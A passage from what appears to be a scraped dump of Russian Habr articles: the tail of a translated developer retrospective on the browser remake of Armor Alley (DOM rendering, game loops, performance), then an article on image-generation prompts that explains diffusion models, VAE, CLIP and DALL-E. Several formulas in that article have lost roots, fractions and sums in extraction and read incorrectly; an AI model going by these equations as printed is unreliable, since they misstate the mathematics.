Пехота, бункеры, взаимодействие с транспортными средствами.
Строка состояния, посадочные площадки топливопровода + действия по ремонту / заправке / перезагрузке. Умные ракеты и радарная система. Система инвентаризации / заказа. Поиск / обнаружение близлежащих объектов (умные ракеты, ИИ).
Устранение неполадок и отладка
Chrome DevTools: фреймы, память, профилирование JS / CPU.
Преобразования CSS + JS feature detection.
Горячие циклы, создание объектов / использование памяти / сборка мусора.
«Архитектура»
Плотно упакованный спрайт, содержащий большую часть игровой графики, созданный для веб-прототипа.
Ванильный JS, SoundManager 2 для аудио. Старые добрые элементы DOM для рендеринга пользовательского интерфейса против <canvas> или WebGL и т.п. Преимущества: естественный DOM createElement() для создания игровых объектов, CSS для их стилизации, манипуляции на основе className, трансформации и анимации.
JavaScript: utils (утилиты) для манипулирования именами классов CSS, событиями DOM, удаления узлов дерева, примесей объектов, клонирования и т.п.
Контроллеры, то есть gameLoop, перебирают коллекции игровых объектов, вызывая метод animate() каждого объекта. Если animate() возвращает true, объект мёртв и контроллер может удалить его из массива. Шаблон повторяется для коллекций транспортных средств, стрельбы, зданий и т.п.
MVC-подобная тема: css, data, dom, интерфейс объектов определён для основных игровых объектов. У некоторых объектов есть дочерние и / или родительские объекты, например, бункер <- цепь -> воздушный шар.
frameCount и модуль определяют интервал поведения — движение, стрельбы, скорости анимации, обнаружения врага и т.п. — то есть if (frameCount % 10 === 0) { fire(); }
Имена объектов + карта типов сопоставляются между именами массивов, паттернами конструктора, именами классов CSS (в общем случае). Например у фургона есть тип (data.type = ‘van’), CSS-свойство .van, он хранится в game-objects.vans и так далее. Каждый объект имеет предсказуемый шаблон DOM, имя класса CSS и структуру данных.
isEnemy применяется к JS, содержит класс .enemy в CSS. Пользовательский интерфейс + логика столкновения, в остальном, в основном, одинаковы.
Обнаружение столкновений / взаимодействие вида враг + объект
nearbyOptions - ""в кого стреляют?""
nearbyObject() - ""is an X (то есть, вертолёт) в зоне досягаемости?""
Object targeting - ""двигаться в сторону вертолёта""
Если есть перекрытие объектов, вызвать target.hit() и предоставить “исходный” интерфейс объекта. Цель определяет взаимодействие — то есть цель может умереть, но может и убить источник.
Анимации
Комбинация style.left / top, некоторых анимаций спрайтов на основе backgroundPosition, а также анимаций и трансформаций CSS. Пошаговая анимация CSS обеспечивает удобные переходы, запускаемые className, например, взрыв танка: .tank.dying {} -> .tank.dead {} Метод animate() применяет vX + vY к x + y, обновляет свойства style.top / left (традиционный подход) или transform (ускорение GPU) для изменения положения узла DOM.
«Наследование»
Наследование данных, структур CSS и т.д. на основе миксинов. Общие имена классов CSS (состояния), атрибуты данных, такие как x, y, dead, isEnemy и т.п. Общие операции: перемещение спрайта (DOM x / y), объект находится слева в объекте верхнего уровня common, аналогичном utils.
Производительность
Используем transform: translate3d(), если поддерживается движение элементов на основе графического процессора по осям x / y, по сравнению с традиционными изменениями стиля слева / сверху. Translate позволяет избежать дорогостоящих перерисовок, вместо этого используя композитинг на основе графического процессора для движения.
JS: избегание создания чрезмерного мусора (например, клонирования объектов в стиле миксина) в горячих / дорогих циклах; уменьшение использование GC, оперативной памяти и общую текучесть кадров. Передаём объекты напрямую / по ссылке, избегая создания новых объектов или изменения исходных значений объектов в циклах. 
Разрушение / очистка объекта: удаляем дерево узлов, ссылки JS / DOM и ссылку на родительский массив в случае коллекции объектов. Минимизируем “ввод-вывод” DOM: кэшируем ссылки и координаты узлов, чтобы уменьшить перекомпоновку из-за операций чтения (например offsetWidth). Обновляем клиентские координаты только при критических событиях, таких как init и window.onresize().
Веб-прототип с GPU-ускоренным преобразованием: translate3d() и возможностью для улучшения. Обратите внимание, что большинство кадров < 16 мс, 60+ кадров в секунду.
Веб-прототип без GPU-ускоренного преобразования: translate3d() — обратите внимание на преобладание красного цвета (дорогая перерисовка) и очень медленные кадры. 
Вот почему не стоит создавать временные, клонированные объекты внутри горячих циклов - порождает множество мусора. На снимке экрана показано “острое” использование ОЗУ и события сборки мусора до того, как дорогостоящая функция будет шунтирована с помощью return false. Надлежащее исправление включало изменения для избежания создания объекта.
Память, количество узлов DOM и сборка мусора JS / DOM
Память и количество узлов DOM со временем увеличиваются и уменьшаются, при этом в идеальном случае узлы DOM (зелёная линия) проходят правильную сборку мусора, поскольку объекты JS и узлы DOM, на которые они ссылаются, очищаются.
Нормальный игровой процесс и распределение памяти показаны выше синим цветом, наряду с растущим числом ссылок на узлы DOM (зелёным). В этом случае пулемёт вертолета стреляет 64 раза и узлы добавляются линейным образом. Когда объекты стрельбы уничтожаются всё успокаивается и в конечном итоге происходит событие сборки мусора.
Когда узлы JS / DOM разыменовываются посредством уничтожения / очистки объекта JS, оставшиеся узлы DOM могут быть надлежащим образом удалены сборщиком мусора. Естественное событие GC отражает это в середине, за которым следуют остальные новые узлы с ручным событием GC, вызванным ближе к концу.
“Detached Dom Trees” Chrome DevTools в разделе “Heap Snapshot Profile” также может пригодиться для поиска утекших узлов DOM; отсоединенный DOM включен в представление сдерживания. На момент написания (1 ноября 2013 г.) могла существовать ошибка, связанная с тем, что узлы DOM с ускорением на GPU не подвергались сборке мусора или просто не отражались на графиках Chrome DevTools. В контексте подробностей можно ознакомиться с информацией здесь - https://code.google.com/p/chromium/issues/detail?id=304689.
«Искусственный интеллект»
На самом деле достаточно глуп. “Логика, основанная на правилах” — более подходящее описание этой реализации.
Умные ракеты: двигаются прямо к цели, плюс небольшое отклонение с изменением ускорения.
Вражеский вертолет: нацеливается на ближайшее облако, воздушный шар, танк или вертолет игрока, если он находится в пределах досягаемости. Фиксированная скорость ускорения, нормализуется до 0, когда находится ""достаточно близко"" к цели. Возвращается на базу, когда закончились боеприпасы + бомбы, топливо или сильно повреждён. Не уклоняется от целей и препятствий. Враг может прятаться в облаках, бомбить проходящие танки в пределах досягаемости, если подобное применимо. 
“Режим воздушного боя”: стремится равняться с вертолётом игрока. Стреляет из пулемёта, когда находится в пределах досягаемости. Если игрок находится прямо под ним, то пытается взорвать его. Препятствует прямому пролёту над или под собой. 
Флажки “прицеливания”: облака, танки, вертолёт, воздушные шары. Если несколько целевых вариантов, логика определяет приоритет. (грубое предпочтение, от низкого к более высокому: облака, воздушные шары, вертолеты, танки).
Построение / сортировка конвоя противником: последовательность ""MTVIE"" через фиксированные промежутки времени - один раз в несколько минут, в зависимости от наличия средств. Вражеский вертолет имеет небольшое преимущество в скорости, что затрудняет погоню или бегство от него.
transform:translate начальное положение
При использовании преобразования графического процессора, перевод в Chrome: обнаружены нечётные / случайные проблемы с перерисовкой, если style.left / top или transformOrigin изначально не назначены. Логический; в противном случае браузер скажет: “преобразовать этот элемент относительно чего?”... Рекомендация: применить начальные значения top / left 0px и / или transform-origin в CSS.
Звуковые эффекты
Звук значительно улучшает впечатления от игры.
Оригинальные 8-битные звуки нельзя было повторно лицензировать; современные замены (и новые звуки) были смешаны из многочисленных Creative Commons и бесплатных источников по типу freesound.org. В частности благодаря звукам Hi-Fi стало веселее взрывать те или иные объекты.
Расстояние влияет на громкость и, в идеале, на эффекты панорамирования звуков (звуки за кадром более тихие и т.п.).
Разные примечания по эффективности и производительности
Обнаружение столкновений — это просто математика. Кэширование / аннулирование, вероятно, будет более дорогим и не стоит затраченных усилий. То же самое касается других простых проверок координат, например, объекта поблизости / на экране / прицеливания. Большая часть времени тратится на GPU / железо, выполнение операций отрисовки / разметки  /рендеринга.
Вещи, которые сработали
Согласованное соглашение об именах внутри объектов, открытый интерфейс через exports = { css, data, dom }; return exports;
Общие методы: animate(), hit(), die() и т.п.
Массивы объектов (фургоны, танки, бункеры) + один контроллер верхнего уровня, цикл, который вызывает animate() для каждого элемента и соответственно удаляет “мертвые” элементы.
Столкновение содержит интерфейсы exports, стандартные свойства, как data и функция hit().
hit() принимает необязательное значение точки и исходного / целевого объекта. В некоторых случаях оба объекта могут быть повреждены или уничтожены. JS меняет имена классов CSS в зависимости от состояния: .enemy, .dying, .dead и так далее. Общие методы “создания” объекта, необязательный параметр / опция, то есть конфигурации, например, isEnemy, x, y, vX, vY.
Интервалы на основе frameCount, устанавливающие анимацию + скорость поведения, например, move() для каждого кадра, fire() только два раза в секунду, обнаружение врагов один раз в секунду и т.п.
Конфигурация поблизости и “столкновение” - легко определить “по кому стреляют”, например, танки -> пехота. “Упреждающий просмотр” по умолчанию влияет на способность транспортного средства “видеть” перед собой.
“utils” для базовых событий DOM, манипулирования именами классов CSS, удаления дерева узлов.
Пакетные изменения DOM, в частности постановка в очередь и удаление узлов в результате деструкции объектов (т.е. гибели  множества экземпляров объектов типа GunFire).
Оглядываясь назад: вещи, которые я бы изменил или пересмотрел
Пересмотр наследование объектов, данных и функций — могут ли почти все игровые объекты наследоваться от каких-либо “спрайтов”, основанных на сортировке.
Могут быть исследованы и реализованы более интеллектуальные алгоритмы обнаружения столкновений.
Трансляция событий? Будет ли это разумно использовать с точки зрения абстракции? (До сих пор - вопрос).
Различные “экспорты” / API для каждого объекта? Больше абстракции, меньше предположений о css, data, dom? Улучшенная абстракция “спрайта” для каждого объекта. Проще манипулировать DOM?
Спрайты в CSS ранее на / SASS / compass для автоматической оптимизации.
Избегание написания каких-либо вызовов setInterval() / setTimeout(). В настоящее время используется для задержек после взрыва перед уничтожением объекта (удаление узла DOM, очистка объекта). Более умное решение: использовать существующий цикл анимации, чтобы применить действие после заданного количества кадров и таким образом уничтожить объект. Частично реализовано.
TODO: настройки и другие мелочи, чтобы привести всё в порядок
Удалить вызовы setTimeout(), используемые для уничтожения объектов, вместо этого перейти к использованию animate() + frameCount для синхронизации (некоторые из них реализованы — см. FrameTimeout() в коде для справки).
Пересмотреть создание объектов, выделение памяти и сборку мусора. В настоящее время не так уж плохо, но всегда есть возможности для улучшения. Объединение объектов можно использовать для обычных объектов, таких как стрельба и т.п. 
Дальнейшие соображения по оптимизации: спрайты изображений и звуковые спрайты, где применимо. Удалить анимированные .GIF, сместить акцент на анимацию спрайтов + CSS, если это будет быстрее / плавнее.
Особенности, которых нет в оригинальной игре
Режим обучения: вводное руководство по игровой механике, задачам и основным стратегиям.
Возможность спрятаться в облаках / замаскироваться от радара (возможно было реализовано в оригинальном многопользовательском режиме, здесь не уверен).
Вражеский вертолёт может прятаться в облаках и может бомбить проходящие танки (“режим скрытой облачной бомбардировки”). С другой стороны, игрок может незаметно проходить над вражескими зенитными орудиями, ракетными установками и вражеской базой, а также над вражеским вертолетом. Добавляет в игру элементы веселья и стелса.
Дополнительные звуковые эффекты для вертолёта, пехоты с парашютом, стрельбы со стороны последней, заклинивания фургона и попадания осколков по объектам.
Вещи, до которых я никогда не доберусь
Мультиплеер. Не из-за отсутствия интереса; думаю это было бы здорово, только времени нет.
Эпилог
Весь игровой мир, 8192px в ширину (исходный масштаб).
Послесловие. 17.05.25.
С момента, когда мы общались последний раз, я успел выпустить множество обновлений для моего ""ремастерированного ремейка"" Armor Alley. Отныне игра содержит все части оригинальной кампании, а также баталии в мультиплеере, оружие, регулировку уровня сложности, подсчёт очков и прочее. Сегодня она может запускаться в режиме 60 к/с, вариант 30 к/с был оставлен в качестве бэкапа, также есть опции, связанные с различного рода дополнительными эффектами и деталями, которые можно отключить.
Я планирую резюмировать обновление в своём блоге в этом году, с указанием множества деталей и того пути, что игра проделала, начиная с 2013 года.
У меня имеется список изменений относительно большинство деталей и возможностей, что пополняется по мере поступления. Я довольно плотно работал над игрой последние несколько месяцев, последний раз список изменений обновлялся в феврале, думаю скоро обновлю его ещё раз.
https://github.com/scottschiller/ArmorAlley/blob/master/CHANGELOG.txt
Также планируется большое обзорное видео на YouTube канале, связанные с обновлением 2025 года, думаю разберусь с этим вопросом в районе лета.
Здесь можно найти краткое представление о том, как игра смотрелась в конце 2024 года:
https://youtube.com/watch?v=ahO7opaW28g
Игра должна быть вполне играбельной в Safari на iOS, а также в Chrome на устройствах, работающих на базе Android, планшетах и сенсорных экранах. Недавно была добавлена поддержка геймпадов.
Также имеется базовая поддержка PvP и кооперативного режима, ведутся работы по улучшению опыта с использованием ""отката сетевого кода"" вместо ""ввода на основе задержки"".
Наконец я добавил дополнительную ""тему"" в библиотеку звуков игры, полностью опциональную, где задействованы Beavis и Butt-Head с MTV. Они по очереди ""отыгрывают"" свои роли, пока вы управляете вертолетом и комментируют ваш прогресс.
Ниже более подробный обзор за декабрь 2023 года, включающий всё перечисленное:
https://youtube.com/watch?v=4FyuEamvTTQ
Я получаю письма от людей, нашедших игру, из разных уголков мира, множество благодарностей, в частности от тех, кто помнит, как они играли в ""AA"" или ""Rescue Raiders"" (1984) на Apple ][ и они говорят, что в моей версии имеется множество деталей, она возвращает воспоминания о былом веселье оригинальной игры. Приятно слышать, что есть и другие лица, которым нравится полученный результат и которые всё ещё помнят эту игру, а также приятно, что я могу помочь им снова пережить этот опыт и испытать чувство ностальгии.
- Scott
Ссылки по теме
Сыграть в веб-прототип
Фотоальбом (заметки, скриншоты процесса разработки, отладка и т.п.)
Armor Alley (веб-прототип) на GitHub
Титры + благодарности (веб-прототип)
Armor Alley в Wikipedia"
Как писать промпты для генерации изображений: часть 1,https://habr.com/ru/companies/bothub/articles/909808/,Сегодня генерация изображений с помощью искусственного интеллекта становится невероятно доступной и всё более востребованной. Теперь для создания уникальных иллюстраций не нужно обладать художественны...,"Сегодня генерация изображений с помощью искусственного интеллекта становится невероятно доступной и всё более востребованной. Теперь для создания уникальных иллюстраций не нужно обладать художественными навыками или годами изучать программы для дизайна. Достаточно лишь вообразить идею, а современные технологии, такие как Midjourney, DALL-E, Stable Diffusion, или Flux сделают её реальностью. С их помощью каждый может воплотить свои мысли в жизнь — будь то реалистичный портрет, красивый пейзаж или же захватывающий мир фантастической вселенной.
Мудрец в черной струящейся мантии с замысловатой вышивкой, держащий древний деревянный посох, светящийся рунами, стоит на скале, возвышаясь над мистической долиной в стиле Теда Несмита
В этой части мы рассмотрим основные принципы написания промптов, которые помогут вам максимально эффективно взаимодействовать с искусственным интеллектом. Мы разберем, как правильно формулировать запросы, какие ключевые слова использовать и как добавлять детали для достижения желаемого результата.
Эти навыки полезны для всех — от обычных пользователей до профессиональных художников, ищущих вдохновение. Рассчитываю, что этот материал принесет вам свежие идеи и знания.
Приятного прочтения!
Как создать промпт
Создание промпта — это первый и самый важный шаг на пути к получению желаемого результата от искусственного интеллекта. Будь то генерация изображений, текстов или даже музыки, правильно составленный запрос становится ключом к воплощению вашей идеи.
Однако важно помнить, что ИИ не ""думает"" так, как мы. Он анализирует ваш запрос, выделяет ключевые элементы и строит результат на основе этих данных. Поэтому успешный промпт должен быть не только понятным, но и детализированным. 
Например, если вы хотите создать изображение, стоит указать стиль, цветовую палитру, ракурс, атмосферу и другие важные детали. 
Важно учесть, что большинство моделей ИИ понимают лучше запрос на английском, чем на русском, так как, большинство моделей ИИ, особенно крупные модели, обучались на огромных объемах текста, в основном на английском языке. Английский язык представлен с более высоким качеством по сравнению с другими языками.
В результате, чтобы получить более точный и развернутый ответ от ИИ, рекомендуется использовать английский язык для формулировки промптов.
Давайте для начала рассмотрим самое основное в создании промптов, а затем перейдём к более сложным примерам и попробуем сгенерировать изображения сами.
Базовые принципы написания промпта
Базовые принципы написания промпта помогают создать четкий и эффективный запрос, который позволит ИИ сгенерировать именно то, что вы хотите. Вот некоторые из них:
Четкость
ИИ лучше понимает конкретные, чем размытые запросы. Например, есть запрос: “Средневековый город”, лучше заменить его на такой: “Средневековый город стоит на горе, деревянные дома с остроконечными крышами”
Детализация
Чем больше деталей, тем точнее будет результат. Можно описать ракурс, освещение или стиль.
Например, вот так: “Серый кот с пушистой шерстью лежит на мягкой белой подушке, на него из окна падают лучи солнца”
Структурированность
Запрос должен быть логичным и последовательным, чтобы ИИ мог правильно вас понять. Можно применять к своим промптам формулу 3 вопроса: “Что + где + как”.
Допустим, я хочу сгенерировать картинку с лесом, написал такой вот промпт: ""Мистический лес с высокими деревьями, расположенный среди гор под покровом ночи, деревья светятся мягким голубым светом, туман стелется по земле"" 
Здесь как раз используется 3 вопроса:
Что? Мистический лес с высокими деревьями
Где? среди гор под покровом ночи
Как? деревья светятся мягким голубым светом, туман стелется по земле
Стиль и атмосфера
Можно указать художественный стиль, будь то манга, реализм или мультяшность. Я попробую сгенерировать картинку в стиле игры Don't Starve.
Мрачный, ручной рисованный стиль игры Don't Starve, главный герой - худощавый персонаж с длинным носом и угловатыми чертами лица, одетый в потрепанную одежду, стоит на фоне жуткого леса, держит в руках лампу, от которой идёт мягкий свет, искаженные деревья с длинными ветвями, похожими на скрюченные пальцы, темное небо с мрачными облаками, контрастные цвета, вокруг летают силуэты странных насекомых, эффект карандашного рисунка, мистическая атмосфера
Если у вас что-то не получается, то вы можете поискать ответ на волнующий вас вопрос в центре знаний о нейросетях — BotHub Academy. Здесь есть примеры работы с Midjourney и другими нейросетями. 
Техническая часть
Сейчас мы рассмотрим, что под капотом у нейросетей для генерации изображений: от базовых принципов их работы и архитектуры до ключевых алгоритмов, таких как GANs, Diffusion Models и GPT, а также разберём, как данные технологии превращают текстовые запросы в детализированные и реалистичные изображения, и поймём, какие параметры и настройки влияют на финальный результат.
Токенизация текста
Перед тем как текстовый запрос будет преобразован в числовое представление, он проходит через процесс токенизации. Токенизация разбивает текст на более мелкие единицы, называемые токенами:
Словами (например, ""груша"", ""город""),
Частью слов (например, ""яблок"" + ""о""),
Символами (например, ""!"", "","", ""."").
Запрос: “Красивый грушевый сад”
Пример токенизации: [""Красивый"", ""грушевый"", ""сад""]
Давайте разберёмся, что такое эмбеддинг:
Эмбеддинг — это способ представления слов (или других объектов, таких как изображения) в виде числовых векторов фиксированной длины. Векторы кодируют семантические свойства слов, то есть их смысл и контекст, в многомерном пространстве.
Каждый токен преобразуется в числовое представление с помощью эмбеддинг-слоя:
""Красивый"" → [0.1, -0.3, 0.5, ..., 0.2]
""грушевый"" → [-0.2, 0.4, 0.1, ..., -0.1]
""сад"" → [0.3, 0.2, -0.4, ..., 0.5]
Каждое число в векторе соответствует значению в определённой ""оси"" многомерного пространства. Такие значения отражают различные признаки слова, такие как его значение, синтаксическая роль или связь с другими словами.
Ключевые слова
Ключевые слова играют центральную роль в работе CLIP, так как они передают основной смысл текстового запроса.
Запрос: ""Ancient city at sunset""
Ключевые слова: ""Ancient"", ""city"", ""sunset""
Нейросеть определит основные элементы изображения: древний городской стиль, закат. ИИ будет опираться именно на данные детали. Если бы был запрос ""A city"", то модель сгенерировала бы более общий результат.
Давайте разберём отличия архитектур вышеприведённых нейросетей:
Stable Diffusion
Архитектура: Модель скрытой диффузии (Latent Diffusion Model, LDM)
современный подход к генерации изображений, который сочетает в себе несколько ключевых компонентов: UNet-архитектуру, вариационные автокодировщики (VAE) и нейросеть для обработки текста (например, CLIP).
Latent Diffusion Models работают в латентном пространстве, что значительно снижает вычислительную сложность по сравнению с традиционными диффузионными моделями, которые оперируют напрямую с пикселями изображения. 
LDM сначала кодирует изображение в латентное представление с помощью VAE, а затем выполняет процесс добавления и удаления шума в латентном пространстве.
Латентное пространство — математическая модель, в которой все возможные образы представлены в виде координат или точек
Процесс диффузии:
Добавление шума:
Изображение xt постепенно ""разрушается"" путем добавления шума на каждом шаге t:
q(xt|xt-1) = N(xt; 1-βtxt-1, βtI)
xt — состояние изображения на шаге t
βt — параметр, определяющий величину шума на шаге t
N(μ,σ2) — нормальное распределение с математическим ожиданием μ и дисперсией σ2
Удаление шума:
Модель обучается восстанавливать изображение из шумового состояния, предсказывая шум на каждом шаге:
p0(xt-1|xt)=N(xt-1;μ0(xt,t),∑0(xt,t))
μ0(xt,t) — предсказанное среднее значение.
∑0(xt,t) — предсказанная дисперсия.
UNet архитектура
UNet — это сверточная нейронная сеть, которая используется для предсказания шума на каждом шаге диффузии. Она состоит из двух частей: энкодера и декодера.
Описание архитектуры UNet класса сверточных нейронных сетей
Данная архитектура относится к классу сверточных нейронных сетей из-за своей структуры и применяемых в ней методов. В классической нейронной сети, называемой полносвязной или регрессивной, имеются входной, выходной и скрытые слои, которые представляют собой набор нейронов, связанных друг с другом. В свою очередь, архитектура UNet не содержит полносвязных слоев, а имеет только карты признаков между входным и выходным слоями, а также ядра свертки для получения и укрепления признаков искомых объектов.
Реализация модели нейронной сети на основе архитектуры UNet класса сверточных нейронных сетей
Данный алгоритм отличается от классической архитектуры нейронной сети U-net класса сверточных нейронных сетей наличием в нем реализации приведения входного изображения к необходимому размеру, из-за существующих ограничений вычислительной мощности, выделяемой для решения поставленной задачи.
Формула для предсказания шума:
UNet предсказывает шум на каждом шаге:
∊0(xt,t)=UNet(xt,t)
xt — текущее состояние изображения,
t — временной шаг.
Variational Autoencoders (VAE)
VAE используются для кодирования изображений в латентное пространство и декодирования их обратно, что снижает вычислительные затраты.
Базовая архитектура вариационного автоэнкодера (VAE)
Энкодер:
Энкодер преобразует изображение x в латентное представление z:
q(z|x)=N(z;μ(x),σ2(x))
μ(x) — среднее значение латентного представления,
σ2(x) — дисперсия латентного представления.
Декодер:
Декодер восстанавливает изображение из латентного представления:
p(x|z)=N(x;μ(z),σ2(z))
μ(z) и σ2(z) — параметры распределения восстановленного   изображения.
Оптимизация VAE:
Цель VAE — минимизировать расхождение между реальным распределением данных и реконструированным распределением. Для этого используется функция потерь:
LVAE=Eq(z|x)[log p(x|z)]-KL(q(z|x)||p(z))
KL — расстояние Кульбака-Лейблера,
p(z) — априорное распределение латентного пространства (обычно стандартное нормальное).
Обработка текста (CLIP)
CLIP (Contrastive Language-Image Pre-training) — это мультимодальная модель, которая связывает текстовые запросы с изображениями. Она используется для создания семантического эмбеддинга текста, который направляется в LDM.
Обработка текста в CLIP
Текстовый энкодер
Преобразует текстовый запрос text в векторное представление etextetext=TextEncoder(text)
Энкодер изображений
Преобразует изображение x в векторное представление eimage:eimage=ImageEncoder(x)
Сравнение текста и изображения:
CLIP обучается максимизировать сходство между etext и eimage для соответствующих пар ""текст-изображение"".
Использование в LDM:
Вложение текста etext подается в UNet как дополнительный вход:∊0(xt,t,etext)=UNet(xt,t,etext)
Общая схема работы LDM:
Кодирование изображения:
Изображение x0 кодируется в латентное представление z0 с помощью VAE:
z0=VAEEncoder(x0)
Добавление шума
Латентное представление z0 постепенно зашумляется:q(zt|zt-1)=N(zt;1-βtzt-1,βtI)
Удаление шума
UNet предсказывает шум ∈0(zt,t,etext):
∊0(zt,t,etext)=UNet(zt,t,etext)
Декодирование изображения:
После завершения процесса диффузии латентное представление zT декодируется обратно в изображение:
xT=VAEDecoder(zT)
Принцип работы: Модель обучается на большом количестве пар «текст-изображение». Из случайного шума шаг за шагом «очищает» изображение, добавляя детали, направляемая текстовым описанием.
Преимущества: 
Открытый исходный код (можно запускать локально).
Гибкость: поддержка дообучения, кастомизации, редакторов.
Большое сообщество и множество расширений.
Высокое качество генерации.
DALL-E
Архитектура: Использует Generative Pre-trained Transformer – GPT в сочетании с диффузионными моделями и моделями автокодировщиков.
DALL-E решает задачу генерации изображений как задачу автозавершения последовательности. Она принимает текстовый запрос (например, ""A red apple on a wooden table"") и генерирует соответствующее изображение. Ключевая особенность DALL-E — использование одного общего трансформера для обработки как текста, так и изображений.
Представление данных:
DALL-E работает с дискретными представлениями данных:
Текст: Текст преобразуется в последовательность токенов (слов или частей слов).
Изображения: Изображения разделяются на патчи (маленькие фрагменты), которые затем кодируются в дискретные токены с помощью модели VQ-VAE (Vector Quantized Variational Autoencoder).
VQ-VAE используется для кодирования изображений в латентное пространство:
Энкодер:
Преобразует изображение x в латентное представление ze:
ze=Encoder(x)
Квантизация:
Латентное представление ze квантизируется в дискретные токены zq:
zq=arg min||ze-zk||2 
Декодер:
Восстанавливает изображение из дискретных токенов:/x=Decoder(zq)
Трансформер
DALL-E использует модифицированную версию архитектуры трансформера для работы с объединённой последовательностью текстовых и визуальных токенов.
Структура трансформера:
Входная последовательность:
Текстовые токены: T = [t1,t2, ...,tn],
Токены изображения: I = [i1,i2, ...,im].
Объединённая последовательность:X=[T;I]=[t1,t2, ...,tn,i1,i2, ...,im]
Позиционное кодирование:
Добавляется позиционное кодирование для учёта порядка токенов:
Xpos=X+PositionalEncoding(X)
Многослойный трансформер:
Применяются несколько слоёв трансформера, каждый из которых состоит из:
Самовнимание (Self-Attention):Attention(Q,K,V)=softmax(QKTdk)V
Q,K,V — матрицы запросов, ключей и значений,
dk — размерность ключей.
Выход трансформера:
На выходе получается последовательность предсказанных токенов изображения:
Î=Transformer(Xpos)
Генерация изображений
Генерация изображений происходит в два этапа:
Трансформер предсказывает токены изображения:
Трансформер генерирует последовательность токенов Î, которая представляет собой дискретное латентное представление изображения.
Декодирование изображения: 
Дискретные токены Î декодируются в пиксельное представление с помощью декодера VQ-VAE:
x=Decoder(Î)
Обучение модели
DALL-E обучается минимизировать следующую функцию потерь:
Перекрёстная энтропия:
Для предсказания правильных токенов изображения:Lcross-entropy= -i=1mlog P(it|i<t,T)
it — истинный токен изображения
i<t — предыдущие токены.
Реконструкция изображения:
Для восстановления изображений с помощью VQ-VAE:Lreconstruction=||x-x1||2
Комбинированная функция потерь:
L=Lcross-entropy+λLreconstruction
где λ — весовой коэффициент.
Принцип работы: Модель получает текстовое описание и по нему генерирует изображение. Использует методы CLIP для связывания текста и изображения и diffusion-метод для синтеза картинки.
Преимущества:
Глубокая интеграция с экосистемой OpenAI.
Высокое качество и разнообразие изображений.
Поддержка сложных текстовых запросов.
Простота использования через веб-интерфейс.
Midjourney
Midjourney — это коммерческий продукт с закрытым кодом, и точные детали его архитектуры не раскрываются. Однако известно, что он основан на современных генеративных моделях, сочетающих diffusion-механизмы и методы глубокого обучения. 
Принцип работы Midjourney заключается в использовании собственной модифицированной архитектуры, вероятно основанной на современных диффузионных или гибридных моделях. Особое внимание уделяется стилистической выразительности, художественности и креативности результатов. 
Генеративные методы, вероятно основанные на диффузионных моделях, позволяют добиваться высокой стилизации и уникальности изображений. 
Среди преимуществ Midjourney можно отметить высокое качество и уникальный художественный стиль изображений, быструю генерацию результатов и поддержку множества параметров для кастомизации, что делает его мощным инструментом для создания визуального контента.
Вот таблица для наглядности:
Также имеется вариант GANs (Generative Adversarial Networks):
Генеративно-состязательные сети — это класс машинного обучения, который используется для генерации новых данных, похожих на исходные.
Данные модели работают в режиме игры с нулевой суммой, где каждая из них стремится улучшить свои результаты за счёт другой.
Принцип работы
Генеративно-состязательные сети работают на принципе состязания двух компонентов: генератора и дискриминатора. 
Генератор создаёт новые данные, такие как изображения, текст или аудио, используя случайный шум в качестве входных данных, и его задача заключается в том, чтобы обмануть дискриминатор, убедив его, что сгенерированные данные являются реальными. 
Дискриминатор, в свою очередь, обучается отличать настоящие данные, взятые из обучающей выборки, от тех, что созданы генератором, и должен определить, какие из них подлинные. 
Генератор и дискриминатор обучаются одновременно, но их цели противоположны: генератор стремится минимизировать вероятность того, что дискриминатор правильно классифицирует сгенерированные данные, тогда как дискриминатор максимизирует свою способность различать реальные и фальшивые данные. 
В результате данного процесса достигается равновесие, при котором генератор создаёт настолько реалистичные данные, что дискриминатор больше не может отличить их от настоящих.
Этапы генерации изображений:
Подготовка данных
Нейросети обучаются на датасетах, содержащих миллионы изображений. Например:
COCO (Common Objects in Context) — датасет с размеченными объектами.
LAION (Large-scale Artificial Intelligence Open Network) — огромный открытый датасет изображений с текстовыми описаниями.
Качество и размер датасета напрямую влияют на способности модели генерировать детализированные и реалистичные изображения.
Обучение модели
В процессе обучения модель изучает связи между текстовыми описаниями и визуальными элементами.
Например, при получении запроса ""закат над горами"", модель учится ассоциировать такие слова, как ""закат"", ""горы"", ""небо"", ""свет"" с соответствующими визуальными паттернами.
Генерация изображения
На этапе генерации пользователь предоставляет текстовый запрос (промпт), который преобразуется в числовое представление (embedding).
Модель использует данный embedding для создания изображения поэтапно:
В случае GANs: генератор создаёт изображение, а дискриминатор проверяет его реалистичность.
В случае diffusion models: модель постепенно ""очищает"" зашумлённое изображение, шаг за шагом улучшая его качество.
Из шума получается изображение по заданному промпту
В контексте генерации изображений модели, подобные GPT, используют подход, основанный на autoregressive моделировании, где изображение рассматривается как последовательность токенов (например, пикселей или их абстрактных представлений)
После генерации изображение может быть улучшено с помощью дополнительных алгоритмов, таких как повышение резкости, коррекция цвета или увеличение разрешения (например, через Hires.fix в Stable Diffusion).
Особенности работы нейросетей
Учтите, что разные нейросети будут давать вам разные результаты на один и тот же промпт. Например, посмотрим на работу Stable Diffusion, Midjourney и DALL-E, задавая им один и тот же промпт.
Промпт: “Величественный средневековый каменный замок, возвышающийся на вершине крутой горы, окруженный обрывами с острыми краями, древние стены покрыты мхом и плющом, высокие башни и стены четко выделяются на фоне бурного неба, темные тучи озаряются вспышками молний, узкая извилистая тропа ведет к воротам замка, у подножия горы густой лес, туман, стиль фэнтези”
Stable Diffusion:
Midjourney:
DALL-E:
Как можете видеть, генерируют они по-разному, каждая нейросеть в своём стиле. Так будет и с другими моделями ИИ, такими, как:
Blue Willow, Gencraft и т.д., ведь каждая из них имеет свои уникальные особенности в обработке запросов, интерпретации промптов и генерации изображений.
Итог
Надеюсь, вы получили новые знания в области искусственного интеллекта, обработке промптов и генерации изображений.
Важно помнить, что процесс создания изображений — это не только поиск идеального результата, но и удовольствие от самого творчества. Эксперименты позволяют вам учиться на практике, находить новые способы выражения идей и постепенно формировать свой собственный стиль. Возможно, вы откроете для себя совершенно новый подход, который станет вашей визитной карточкой.
А что добавили бы вы в теорию о создании промптов? Может я что-то упустил? Пишите об этом в комментариях.
Продолжение находится здесь.
Спасибо за прочтение!"
Как писать промпты для генерации изображений: часть 2,https://habr.com/ru/companies/bothub/articles/910136/,"Теперь, когда мы знакомы с теорией, можем взглянуть на практическую часть. Когда дело доходит до практики, важно помнить и знать ключевые принципы, которые помогут вам создавать эффективные промпты.
